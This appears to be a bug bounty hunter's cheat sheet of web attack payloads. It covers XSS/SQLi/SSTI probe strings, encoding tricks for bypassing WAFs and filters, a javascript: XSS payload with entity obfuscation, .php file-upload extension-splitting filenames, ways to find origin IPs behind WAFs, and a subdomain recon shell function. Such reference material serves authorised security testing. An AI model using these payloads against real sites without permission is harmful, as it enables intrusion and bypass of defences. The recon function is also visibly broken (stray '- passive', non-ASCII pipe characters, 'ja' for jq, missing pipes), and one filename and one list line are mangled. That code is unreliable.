---
layout: memory
title: Bug Bounty Cheat Sheet
---

<p align="center">
<img width="120" src="/images/bugbounty.png">
</p>
A cheat sheet for quick testing related to some of my Bug Bounty activities

- [Test for XSS or SQLi as a oneliner](#test-for-xss-or-sqli-as-a-oneliner)
- [A full-width version of symbols related to XSS, CRLF, WAF bypass](#a-full-width-version-of-symbols-related-to-xss-crlf-waf-bypass)
- [Line terminators for XSS / CRLF injection](#line-terminators-for-xss--crlf-injection)
- [Bypass WAF](#bypass-waf)
- [Injecting HTML character entities in different places of the URL](#injecting-html-character-entities-in-different-places-of-the-url)
- [Encodings for Common Symbols used for testing](#encodings-for-common-symbols-used-for-testing)
- [File upload extension splitting](#file-upload-extension-splitting)
- [Autorecon for a domain](#autorecon-for-a-domain)


## Test for XSS or SQLi as a oneliner

Testing Oneliner: `qwert'"<x</`

Explanation:
```
qwert - easy to type & find in HTML
'" - JS/HTML breakout & SQLi
<x - HTML injection test
</ - <script> breakout

extra for SSTI/CSTI

{{[7*7]}}${7*7}qwe'"<x</
```

## A full-width version of symbols related to XSS, CRLF, WAF bypass

```
＜ = %EF%BC%9C = \uFF1C ⇒ %3C (<)
＞ = %EF%BC%9E = \uFF1E ⇒ %3E (>)
＼ = %EF%BC%BC = \uFF3C ⇒ %5C (\)
／ = %EF%BC%8F = \uFF0F ⇒ %2F (/)
＇ = %EF%BC%87 = \uFF07 ⇒ %27 (')
＂ = %EF%BC%82 = \uFF02 ⇒ %22 (")

%0A (LF) ⇒ %EF%BB%AA = \uFEEA = ﻪ
%0D (CR) ⇒ %EF%BB%AD = \uFEED ⇒ ﻭ
```

This was produced by using this script:

```python
import argparse
import urllib.parse

def create_full_width(hex_value):
    hex_value = hex_value.upper()
    base_decimal = int(hex_value, 16)
    s = chr(base_decimal)

    if hex_value == '0A':
        s = 'LF'
    if hex_value == '0D':
        s = 'CR'

    fw_decimal = base_decimal + 0xFEE0
    fw_hex = format(fw_decimal, 'X')
    fw_char = chr(fw_decimal)
    fw_enc = urllib.parse.quote(fw_char).upper()

    return f"{fw_char} = %{fw_enc} = \\u{fw_hex} ⇒ %{hex_value} ({s})"

def showcase():
    # Example usage
    print(create_full_width('3C'))  # Output: ＜ = %EF%BC%9C = \uFF1C ⇒ %3C (<)
    print(create_full_width('3E'))  # Output: ＞ = %EF%BC%9E = \uFF1E ⇒ %3E (>)
    print(create_full_width('5C'))  # Output: ＼ = %EF%BC%BC = \uFF3C ⇒ %5C (\)
    print(create_full_width('2F'))  # Output: ／ = %EF%BC%8F = \uFF0F ⇒ %2F (/)
    print(create_full_width('27'))  # Output: ＇ = %EF%BC%87 = \uFF07 ⇒ %27 (')
    print(create_full_width('22'))  # Output: ＂ = %EF%BC%82 = \uFF02 ⇒ %22 (")
    print(create_full_width('0A'))  # Output: %0A (LF) ⇒ %EF%BB%AA = \uFEEA = ﻪ
    print(create_full_width('0D'))  # Output: %0D (CR) ⇒ %EF%BB%AD = \uFEED ⇒ ﻭ


def main():
    parser = argparse.ArgumentParser(description="Convert hex values to full-width characters and their URL-encoded representations.")
    parser.add_argument("--hex", help="Input hex value to convert", type=str, default=None)
    parser.add_argument("--demo", help="Showcase with demo input", action="store_true")
    args = parser.parse_args()

    if args.demo:
        showcase()
        
    if args.hex:
        print(create_full_width(args.hex))

if __name__ == "__main__":
    main()
```


## Line terminators for XSS / CRLF injection

```
LF: %0A (\u000A)
VT: %0B (\u000B)
FF: %0C (\u000C)
CR: %0D (\u000D)
CR+LF: %0D%0A (\u000D\u000A)
NEL: %C2%85 (\u0085)
LS: %E2%80%A8 (\u2028)
PS: %E2%80%A9 (\u2029)
```

## Bypass WAF 

Bypass by discovering the origin IP address of a server using the following:

- search domain on [Censys](https://search.censys.io/)
- domain history on [SecurityTrails](https://securitytrails.com/)
- test pingbacks (XML-RPC, SSRF)
- fake email to domain & check receipt
- receive domain email & check headers


## Injecting HTML character entities in different places of the URL

```html
<a href="{A}javas{B}cript{C}:alert(1)">
```

1. &#01, &#02 ... up to ... &#32
1. &#09, &#10, &#13
1. &#09, &#10, &#13

Example:
```html
<a href="&#27;javas&#09;cript&#13;:alert(1)">
Click Me
</a>
```


## Encodings for Common Symbols used for testing

```
`<` = %3C \u003c &#x3c; &#60; &lt;
`>` = %3E \u003e &#x3e; &#62; &gt;
`'` = %27 \u0027 &#x27; &#39; &apos;
`"` = %22 \u0022 &#x22; &#34; &quot;
`\` = %5C \u005c &#x5c; &#92; &bsol;
`/` = %2F \u002f &#x2f; &#47; &sol;
`:` = %3A \u003A &#x3A; &#58; &colon;
`%` = %25 \u0025 &#x25; &#37; &percnt;
`&` = %26 \u0026 &#x26; &#38; &amp;
`.` = %2E \u002e &#x2e; &#46; &period;
``` = %60 \u0060 &#x60; &#96; &grave;
`+` = %2B \u002B &#x2b; &#43; &plus;
```

## File upload extension splitting

```
qwe.php.png
qwe.php\x20.png
qwe.php\00.png
qwe.php\x00.png
qwe.php%00.png
qwe.php&#00;.png
qwe. e.php&#x00; .png
qwe.php\u0000.png
qwe.php%20.png
qwe.php&#20;.png
qwe.php&#x20;.png
qwe.php; .png
qwe.php%3B.png
qwe.php\x3B.png
qwe.php&#59;.png
qwe.php&#x3b;.png
qwe.php\u003b.png
qwe.php\u563b.png
qwe.php%C0%bb.png
qwe.php%E5%98%bb.png
qwe.php%E0%80%bb.png
qwe.php%E0%80%80.png
qwe.php%C0%A0.] 9.png
qwe.php%E5%98%A0.png
qwe.php%E0%80%A0.png
qwe.php\u5600.png
qwe.php\u5620.png
qwe.php%C0%80.png
qwe.php\u0020.png
```


## Autorecon for a domain

Make sure that this stuff is present:
* [amass](https://github.com/owasp-amass/amass)
* [assetfinder](https://github.com/tomnomnom/assetfinder)
* [chaos-client](https://github.com/projectdiscovery/chaos-client)
* [subfinder](https://github.com/projectdiscovery/subfinder)
* [dnsx](https://github.com/projectdiscovery/dnsx)
* [httpx](https://github.com/projectdiscovery/httpx)

```bash
 function autorecon {
	export d=$1
	amass enum - passive -norecursive -noalts -d $d -o domains-$d
	amass enum -passive -norecursive -noalts -df domains-$d -o domains-all-$d
	assetfinder -subs-only $d | anew domains-all-$d
	chaos -silent -d $d anew domains-all-$d
	subfinder -silent -d $d anew domains-all-$d
	cat domains-all-$d❘ dnsx -json -o dnsx-$d.json
	cat dnsx-$d.json | ja -r '.host' ❘ httpx -favicon -jarm -include-chain -p http:80, 8080, 8888, https:443,8443,8088 -json -o httpx-$d.json
}
```